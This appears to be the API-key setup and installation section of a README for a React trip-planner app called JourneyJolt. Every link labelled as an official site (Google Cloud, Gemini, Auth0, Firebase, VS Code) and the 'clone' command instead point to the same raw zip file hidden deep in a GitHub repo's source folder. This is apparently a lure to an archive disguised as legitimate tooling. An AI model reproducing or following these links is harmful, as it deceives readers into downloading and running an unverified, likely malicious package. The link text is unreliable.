### Services & API Keys Setup

To fully integrate JourneyJolt with third-party services, you'll need to sign up for the following services, configure the required settings, and obtain API keys. Below are the steps for each service:

 
<details>
  <summary>Google Cloud Setup</summary>
    Follow these steps to set up Google Cloud for your project:
  <ol>
    <li>Create an account on <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Google Cloud</a>.</li>
    <li>As a new user, you will receive a free trial with 90 days and ₹25,000 in free credits, which you can use for your project.</li>
    <li>After setting up your account, go to the <b>APIs & Services</b> section to create an API key.</li>
    <li>Next, enable the following APIs:
      <ul>
        <li>Maps JavaScript API</li>
        <li>Maps Embed API</li>
        <li>Geolocation API</li>
        <li>Geocoding API</li>
        <li>Places API</li>
        <li>Places API (New)</li>
      </ul>
    </li>
    <li>The "Places API (New)" may require you to set up a billing account. Don’t worry, your free credits are more than enough to cover the cost!</li>
    <li>Once everything is set up, you will have your Google API key ready to use.</li>
    <li>Paste the API key in your environment file: 
      <pre><code>VITE_GOOGLE_MAP_API_KEY="YOUR_GOOGLE_API_KEY"</code></pre>
    </li>
  </ol>
</details>

<details>
  <summary>Gemini API Setup</summary>
    Follow these steps to set up the Gemini API:
  <ol>
    <li>Go to the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Gemini AI website</a>.</li>
    <li>Create an account if you don't have one, or sign in with your existing account.</li>
    <li>The Gemini API is free, meaning there are no charges associated with using it for your project.</li>
    <li>Once your account is set up, you can start using the Gemini API for your project.</li>
    <li>Paste the API key in your environment file: 
      <pre><code>VITE_GEMINI_API_KEY="YOUR_GEMINI_API_KEY"</code></pre>
    </li>
  </ol>
</details>


<details>
  <summary>Auth0 Setup</summary>
  <p>
    Follow these steps to set up Auth0 for your project:
  </p>
  <ol>
    <li>Go to the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Auth0 website</a>.</li>
    <li>Create a free account. The free plan supports up to 25,000 monthly active users, which is more than enough for our project.</li>
    <li>After signing up, select the type of project you are creating. Choose "Single Page Application" as we are building a React app.</li>
    <li>Once your account is set up, create a new application within Auth0.</li>
    <li>Go to the settings of the created application to get the authentication credentials.</li>
    <li>You'll need the following credentials:
      <ul>
        <li><strong>Domain Name</strong></li>
        <li><strong>Client ID</strong></li>
      </ul>
    </li>
    <li>Paste the credentials into your environment file:
      <pre><code>VITE_DOMAIN_NAME="your-auth0-domain"</code></pre>
      <pre><code>VITE_AUTH0_CLIENT_ID="your-client-id"</code></pre>
    </li>
  </ol>
  <p><strong>Important Note:</strong> After running the project, you will need to configure the callback URL and logout URL in the Auth0 application settings. The callback URL should be the hosted URL of your React app when it is running locally or deployed. <em>(generally: http://localhost:5173/)</em></p>
</details>

<details>
  <summary>Firebase Setup</summary>
  <ul>
    <li>Visit the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip">Firebase website</a> and create an account or log in if you already have one.</li>
    <li>Once logged in, create a new project by clicking on "Add Project". Follow the prompts for setting up the project. Choose the "Test mode" option for the database so you can easily set up read and write permissions.</li>
    <li>After the project is created, click on the "Web" icon to create a new web app within the Firebase project.</li>
    <li>Follow the prompts to register your app. Firebase will provide you with the necessary configuration details during this step.</li>
    <li>Once the web app is created, go to your Firebase Console, and select the project you just created.</li>
    <li>Navigate to the "Project settings" by clicking on the gear icon near the top left corner.</li>
    <li>In the "General" tab, you will find the credentials for your Firebase project. These credentials are needed to set up Firebase in your React project.</li>
    <li>Copy the credentials provided by Firebase (e.g., API key, auth domain, etc.) and paste them into your `.env` file with the following format:</li>
  </ul>
  <pre>
    VITE_FIREBASE_API_KEY = "your-api-key-here"
    VITE_FIREBASE_AUTH_DOMAIN = "your-auth-domain-here"
    VITE_FIREBASE_PROJECT_ID = "your-project-id-here"
    VITE_FIREBASE_STORAGE_BUCKET = "your-storage-bucket-here"
    VITE_FIREBASE_MESSAGING_SENDER_ID = "your-messaging-sender-id-here"
    VITE_FIREBASE_APP_ID = "your-app-id-here"
    VITE_MEASUREMENT_ID = "your-measurement-id-here"
  </pre>
</details>

## Installation

</div>

The installation process is straightforward. You can either clone the repository or download the zip file of the code.

### Steps to Install and Set Up:

1. **Clone the repository or download the ZIP file**  
   - To clone the repo, run the following command:
     ```sh
     https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip
     ```
   - Alternatively, you can download the ZIP file from the repository page and extract it.

2. **Open the project folder in a code editor**  
   Open the folder in your preferred code editor (e.g., [VS Code](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)).

3. **Set up the `.env` file**  
   The main objective is to set up your `.env` file with the necessary API keys.  
   - Follow the steps in the **Setup and API Keys** section to get the required API keys for Google Cloud, Gemini API, Auth0, and Firebase.
   - After getting the keys, create a `.env` file in the root of the project and add the required keys like so:
     ```env
     VITE_GOOGLE_MAP_API_KEY = "your-google-api-key"
     VITE_GEMINI_API_KEY = "your-gemini-api-key"
     VITE_AUTH0_CLIENT_ID = "your-auth0-client-id"
     VITE_DOMAIN_NAME = "your-auth0-domain-name"
     VITE_FIREBASE_API_KEY = "your-firebase-api-key"
     VITE_FIREBASE_AUTH_DOMAIN = "your-firebase-auth-domain"
     VITE_FIREBASE_PROJECT_ID = "your-firebase-project-id"
     VITE_FIREBASE_STORAGE_BUCKET = "your-firebase-storage-bucket"
     VITE_FIREBASE_MESSAGING_SENDER_ID = "your-firebase-messaging-sender-id"
     VITE_FIREBASE_APP_ID = "your-firebase-app-id"
     VITE_MEASUREMENT_ID = "your-firebase-measurement-id"
     ```

4. **Install required NPM packages**  
   Once the `.env` file is set up, install the required NPM packages:
   ```sh
   npm install
   ```

5. **Run the Project**  
  After the packages are installed, you can start the development server by running:
   ```sh
   npm run dev
   ```
    This will run the project locally and you can access it at http://localhost:5173.

#### By following these simple steps, you'll have the project up and running in no time!
